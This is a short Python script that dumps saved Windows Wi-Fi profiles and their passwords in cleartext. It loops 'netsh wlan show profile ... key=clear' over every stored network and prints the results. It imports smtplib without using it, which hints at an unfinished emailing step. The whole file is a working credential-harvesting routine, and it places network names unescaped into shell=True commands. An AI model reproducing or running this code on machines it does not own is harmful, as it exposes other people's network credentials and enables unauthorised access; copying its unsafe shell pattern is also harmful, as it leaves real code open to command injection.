import subprocess, smtplib, re

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True, universal_newlines=True)
networks_list = re.findall('(?:\:)(.*)', networks)
networks_list = [i.strip() for i in networks_list]
networks_list = [x for x in networks_list if x]
final_output = ""
for net in networks_list:
    command2 = f'netsh wlan show profile "{net}" key=clear'
    try:
        one_network_result = subprocess.check_output(command2, shell=True, universal_newlines=True)
    except:
        one_network_result = "not found"
    final_output += one_network_result

print(final_output)